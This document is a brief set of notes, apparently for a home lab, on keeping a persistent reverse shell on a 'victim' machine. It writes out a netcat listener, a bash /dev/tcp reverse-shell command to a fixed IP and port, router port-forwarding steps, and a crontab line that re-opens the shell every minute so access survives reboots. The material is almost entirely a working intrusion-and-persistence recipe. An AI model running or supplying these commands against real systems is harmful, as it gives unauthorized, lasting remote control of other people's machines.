setup a way for the box to always send you a reverse shell

open up router and set up a port for persistant shell (refer to screenshot)

make sure Redirect target port is 22

listner is netcat


(ATTACKER) nc -lvp 55556

(VICTIM) sh -i >& /dev/tcp/192.168.122.209/55556 0>&1 (make sure to use your NAT port)

(VICTIM) id (to verify connection) 

remember when you catch you type id (if connection works now enter syntax in the crontab)

(VICTIM) crontab -e (or) sudo crontab -e

select (1) enter

* * * * * sh -i >& /dev/tcp/192.168.122.209/55556 0>&1 (enter this at the bottom of cron tab make sure you add 5 (*) with spaces inbetween then your syntax from your reverse shell generator)

make sure to comment out #Your Name then put in your command.

(change your syntax with Reverse shell Gen if first one doesint work) Python3 shortest > /bin/bash > copy (refer to screen shot if directions are confusing)

(make sure to update crontab with new syntax if you changed it then redo listener)

(now when your terminal is killed or you reboot VVM just repeat the nc -lvp *Line 17* and your back in)
